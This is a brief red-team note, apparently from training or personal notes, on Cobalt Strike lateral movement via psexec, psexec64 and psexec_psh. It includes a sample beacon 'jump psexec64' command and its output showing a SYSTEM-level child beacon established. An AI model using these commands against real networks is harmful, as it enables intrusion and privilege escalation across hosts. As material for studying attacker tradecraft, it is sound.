## Description:  

For Lateral Movement in Cobalt Strike

TheÂ `psexec`Â /Â `psexec64`Â commands work by first uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. Â `psexec_psh`Â doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).

Beacons executed this way run as SYSTEM.

```
beacon> jump psexec64 srv-1 smb
Started service dd80980 on srv-1
[+] established link to child beacon: 10.10.17.25
